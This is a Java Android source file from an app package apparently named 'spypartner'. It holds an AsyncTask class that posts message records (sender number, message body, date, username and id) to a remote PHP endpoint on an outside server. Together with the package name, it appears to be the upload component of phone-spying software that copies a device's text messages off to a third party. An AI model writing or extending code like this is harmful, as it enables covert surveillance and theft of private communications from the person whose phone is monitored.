package com.spypartner.jmtechnologies;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.support.v4.app.NotificationCompat;
import android.widget.RemoteViews;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Created by JoshT on 02/02/2019.
 */

public class SendMessagesToDataBase extends AsyncTask<String, String, String> {
    @SuppressLint("StaticFieldLeak")
    private Context context;

    SendMessagesToDataBase(Context ctx){
        context = ctx;
    }


    @Override
    protected void onPreExecute(){
        super.onPreExecute();

    }

    @Override
    protected String doInBackground(String... params) {

        String type = params[0];
        URL url;
        HttpURLConnection httpURLConnection = null;
        String sendUrl = "https://www.mblog.co.ke/android/sendmessages.php";//online server url
        //String sendUrl = "http://10.0.2.2/androidconnect/sendmessages.php";//localhost url

        if (type.equals("send")) {
            String id = params[1];
            String username = params[2];
            String number = params[3];
            String body = params[4];
            String date = params[5];

            if (CheckNetworkStatus.isNetworkAvailable(context)){
                try {
                    url = new URL(sendUrl);
                    httpURLConnection = (HttpURLConnection) url.openConnection();
                    httpURLConnection.setReadTimeout(5000);
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setDoInput(true);

                    String charset = "UTF-8";
                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
                    String post_data = URLEncoder.encode("id", charset) + "=" + URLEncoder.encode(id, charset) + "&"
                            + URLEncoder.encode("username", charset) + "=" + URLEncoder.encode(username, charset) + "&"
                            + URLEncoder.encode("number", charset) + "=" + URLEncoder.encode(number, charset) + "&"
                            + URLEncoder.encode("body", charset) + "=" + URLEncoder.encode(body, charset) + "&"
                            + URLEncoder.encode("date", charset) + "=" + URLEncoder.encode(date, charset);
                    bufferedWriter.write(post_data);
                    //System.out.println(post_data);
                    bufferedWriter.flush();
                    bufferedWriter.close();

                    //check servers status
                    int status = httpURLConnection.getResponseCode();
                    String result = "";

                    if (status == HttpURLConnection.HTTP_OK){
                        InputStream inputStream = httpURLConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "iso-8859-1"));

                        String line;
                        while ((line = bufferedReader.readLine()) != null) {
                            result += line;
                        }
                        System.out.println("------------------"+id+"--------------------");
                        bufferedReader.close();
                        inputStream.close();
                        httpURLConnection.disconnect();
                        System.out.println("---------------finished sending messages----------------------");
                    }else {
                        System.out.println(status);
                        throw new IOException("Server's response: "+status);
                    }
                    System.out.println(status);
                    return result;

                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (ProtocolException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }finally {
                    assert httpURLConnection != null;
                    httpURLConnection.disconnect();
                }
        }else
                try {
                    url = new URL(sendUrl);
                    httpURLConnection = (HttpURLConnection)url.openConnection();
                    httpURLConnection.disconnect();
                    System.out.println("---------------connection disconnected-----------");
                    System.out.println("---------------------no internet connectivity!--------------------------------------");

                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
        }
        return null;
    }

    @Override
    protected  void onPostExecute(String s){
        //Toast.makeText(context, "completed sending messages to database", Toast.LENGTH_SHORT).show();
        System.out.println("-------------------------------------------"+s+"-----------------------------------------");

    }
   
}
